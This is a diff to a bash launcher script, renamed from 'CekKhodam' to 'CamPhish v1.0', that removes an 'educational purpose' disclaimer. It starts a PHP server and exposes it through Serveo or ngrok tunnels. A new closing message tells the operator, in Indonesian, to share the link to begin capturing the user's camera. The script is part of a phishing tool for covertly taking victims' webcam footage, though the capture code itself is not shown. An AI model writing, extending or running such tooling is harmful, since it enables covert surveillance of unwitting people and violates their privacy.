@@ -1,6 +1,5 @@
 #!/bin/bash
-# CekKhodam v1.0
-# Only Educational Purpose
+# CamPhish v1.0 - Adrian (No Khodam Video)
 
 trap 'echo; stop' 2
 
@@ -14,6 +13,14 @@ stop() {
 
 dependencies() {
     command -v php >/dev/null 2>&1 || { echo "PHP belum terinstall!"; exit 1; }
+    command -v ssh >/dev/null 2>&1 || { echo "SSH belum terinstall!"; exit 1; }
+}
+
+banner() {
+    clear
+    echo -e "\e[1;92m====================================\e[0m"
+    echo -e "\e[1;93m        CAMPHISH v1.0 - Adrian      \e[0m"
+    echo -e "\e[1;92m====================================\e[0m"
 }
 
 start_php() {
@@ -40,12 +47,6 @@ start_ngrok() {
     echo "[+] Ngrok link: $link"
 }
 
-banner() {
-    clear
-    echo -e "\e[1;92m Cek Khodam - Only Educational Purpose \e[0m"
-}
-
-# Pilih tunnel
 select_tunnel() {
     echo "----- Pilih Tunnel -----"
     echo "[1] Serveo.net"
@@ -54,7 +55,6 @@ select_tunnel() {
     option="${option:-1}"
 }
 
-# Main
 banner
 dependencies
 start_php
@@ -69,4 +69,4 @@ else
     start_serveo
 fi
 
-echo "[*] Server berjalan. Buka link di browser target untuk mulai."
+echo "[*] Server berjalan. Bagikan link di atas untuk mulai pengambilan kamera user."
